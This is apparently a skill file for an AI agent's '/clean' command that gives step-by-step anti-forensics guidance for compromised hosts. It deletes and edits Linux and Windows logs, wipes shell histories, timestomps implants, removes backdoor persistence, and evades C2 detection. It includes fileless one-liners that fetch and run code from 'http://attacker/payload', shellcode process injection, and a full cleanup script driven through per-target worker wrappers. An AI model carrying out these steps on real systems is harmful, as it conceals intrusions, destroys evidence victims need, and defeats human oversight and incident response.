---
name: clean
description: Anti-forensics cleanup, log clearing, artifact removal, and attribution evasion for compromised systems
type: security
---

# /clean Skill

Anti-forensics and OPSEC cleanup on compromised systems. Minimize detection, remove artifacts, clear logs, evade attribution.

## Usage

```
/clean <target>
```

## Identity and Attribution

### Generic Usernames
Use these usernames to blend with system accounts:
- `admin` - Generic admin account
- `user` - Standard user account
- `service` - Service account
- `backup` - Backup service account
- `monitor` - Monitoring service account
- `support` - Support account
- `deploy` - Deployment account

### OPSEC Rules
- Never use real name, handle, or personalized patterns
- Rotate identities across different targets
- Use anonymous infrastructure (VPN, VPS, proxies)
- Compartmentalize: separate identity per target, per phase
- Don't reuse email, SSH keys, or infrastructure across targets

## Linux Log Evasion

### Shell History
```bash
history -c
unset HISTFILE
export HISTFILE=/dev/null
rm -f ~/.bash_history ~/.zsh_history
ln -sf /dev/null ~/.bash_history
```

### Auth Logs
```bash
# Remove auth logs
rm -f /var/log/auth.log*
rm -f /var/log/secure*
rm -f /var/log/faillog
rm -f /var/log/lastlog

# Clear systemd journal
journalctl --vacuum-time=1s
systemctl stop systemd-journald 2>/dev/null
rm -rf /var/log/journal/*
```

### Application Logs
```bash
# Web servers
rm -f /var/log/apache2/*
rm -f /var/log/httpd/*
rm -f /var/log/nginx/*

# Databases
rm -f /var/log/mysql/*
rm -f /var/log/postgresql/*
rm -f /var/log/mongodb/*

# Mail
rm -f /var/log/mail.*

# Clear specific entries
sed -i '/YOUR_IP/d' /var/log/syslog
sed -i '/YOUR_IP/d' /var/log/messages
```

### System Logs
```bash
# Wtmp/Btmp (login records)
echo > /var/log/wtmp
echo > /var/log/btmp

# Lastlog
> /var/log/lastlog

# Syslog
> /var/log/syslog
> /var/log/messages

# Dmesg
dmesg -c
```

### Shell Histories (All Users)
```bash
for user in $(ls /home); do
    rm -f /home/$user/.bash_history
    rm -f /home/$user/.zsh_history
    rm -f /home/$user/.mysql_history
    rm -f /home/$user/.psql_history
    rm -f /home/$user/.lesshst
    rm -f /home/$user/.viminfo
    rm -f /home/$user/.wget-hsts
done
rm -f /root/.bash_history /root/.zsh_history /root/.mysql_history /root/.psql_history
```

## Artifact Removal

### File Wipe
```bash
# Secure wipe single file
shred -uz -n 3 /path/to/file

# Wipe with random data
dd if=/dev/urandom of=/path/to/file bs=1M count=10 conv=notrunc
rm -f /path/to/file

# Wipe directory recursively
find /path/to/dir -type f -exec shred -uz -n 3 {} \;
rm -rf /path/to/dir
```

### Cleanup Persistence
```bash
# Remove cron jobs
crontab -r 2>/dev/null
rm -f /etc/cron.d/backdoor
rm -f /etc/cron.daily/backdoor
rm -f /etc/cron.hourly/backdoor

# Remove systemd timers
systemctl stop backdoor.timer 2>/dev/null
systemctl disable backdoor.timer 2>/dev/null
rm -f /etc/systemd/system/backdoor.*
systemctl daemon-reload

# Remove startup scripts
rm -f /etc/init.d/backdoor
rm -f /etc/rc.d/init.d/backdoor
```

### Clean Temp Directories
```bash
# /tmp and /dev/shm
rm -rf /tmp/*
rm -rf /dev/shm/*
rm -rf /var/tmp/*

# User caches
for user in $(ls /home); do
    rm -rf /home/$user/.cache/*
done
rm -rf /root/.cache/*

# SSH artifacts
rm -f /root/.ssh/authorized_keys.backdoor
rm -f /home/*/.ssh/authorized_keys.backdoor
```

### Remove Created Accounts
```bash
# Delete user and home directory
userdel -rf backdoor_user 2>/dev/null

# Remove from sudoers
sed -i '/backdoor_user/d' /etc/sudoers
rm -f /etc/sudoers.d/backdoor_user
```

## Timestomping

### Match Legitimate Timestamps
```bash
# Match /bin/ls timestamp
touch -r /bin/ls /tmp/backdoor

# Specific timestamp
touch -t 202101010000.00 /tmp/backdoor

# Recursive directory timestomp
touch -r /usr/bin /path/to/implant_dir
find /path/to/implant_dir -exec touch -r /usr/bin {} \;
```

### Python Timestomp
```python
import os
import time

# Set specific timestamp
os.utime('/path/to/file', (1609459200, 1609459200))

# Match another file's timestamp
stat = os.stat('/bin/ls')
os.utime('/path/to/file', (stat.st_atime, stat.st_mtime))
```

## Network Evasion

### C2 Evasion
- Use domain fronting (CloudFront, Azure Edge, Google App Engine)
- Implement jitter: random sleep 30-300 seconds between beacons
- Encrypt all C2 traffic (TLS 1.3, custom encryption)
- Use common protocols: DNS tunneling, HTTPS, WebSocket
- Randomize User-Agent each request
- Rotate through multiple C2 endpoints

### Traffic Patterns
```python
import random
import time

# Random jitter
sleep_time = random.randint(30, 300)
time.sleep(sleep_time)

# Random user agents
uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.0'
]
headers = {'User-Agent': random.choice(uas)}
```

## Windows Log Evasion

### Clear Event Logs
```powershell
# Clear all logs
wevtutil el | Foreach-Object {wevtutil cl "$PSItem"}

# Clear specific logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

### Remove PowerShell History
```powershell
# Clear PSReadline history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear run history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
```

### Artifact Cleanup
```powershell
# Clear temp files
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Temp\* -Recurse -Force -ErrorAction SilentlyContinue

# Clear prefetch
Remove-Item C:\Windows\Prefetch\* -Force -ErrorAction SilentlyContinue

# Clear recent files
Remove-Item $env:APPDATA\Microsoft\Windows\Recent\* -Force -ErrorAction SilentlyContinue
```

## Memory-Only Execution

### Fileless Techniques
```bash
# Execute from memory (/dev/shm)
cd /dev/shm
wget -qO- http://attacker/payload | bash

# Direct memory execution with Python
python3 -c "exec(__import__('urllib').request.urlopen('http://attacker/payload').read())"

# Perl memory execution
perl -e 'use LWP::Simple; eval(get("http://attacker/payload"));'
```

### Process Injection
```python
import ctypes
import sys

# Example: shellcode injection (requires adaptation)
process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
remote_memory = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.WriteProcessMemory(process_handle, remote_memory, shellcode, len(shellcode), 0)
ctypes.windll.kernel32.CreateRemoteThread(process_handle, 0, 0, remote_memory, 0, 0, 0)
```

## Automated Cleanup Script

### Linux Full Cleanup
```bash
#!/bin/bash
# full_clean.sh - Comprehensive anti-forensics cleanup

TARGET_IP="$1"

echo "[*] Starting cleanup for $TARGET_IP"

# Kill all processes
pkill -f backdoor 2>/dev/null

# Clear history
history -c
unset HISTFILE

# Remove shell histories
rm -f ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history
find /home -name ".bash_history" -delete 2>/dev/null
find /home -name ".zsh_history" -delete 2>/dev/null

# Clear logs
> /var/log/wtmp
> /var/log/btmp
> /var/log/lastlog
journalctl --vacuum-time=1s 2>/dev/null

# Remove artifacts
rm -rf /tmp/* /dev/shm/* /var/tmp/* 2>/dev/null

# Timestomp remaining files (optional)
find /tmp -exec touch -r /bin/ls {} \; 2>/dev/null

echo "[*] Cleanup complete"
```

## Worker Integration

Store cleanup scripts in worker directory:
```
./workers/{target}/
  cleanup/
    clean_logs.sh
    clean_artifacts.sh
    timestomp.sh
    full_wipe.sh
```

Execute via connect wrapper:
```bash
python3 workers/1.2.3.4/connect.py clean full
python3 workers/1.2.3.4/connect.py clean logs
python3 workers/1.2.3.4/connect.py clean artifacts
```
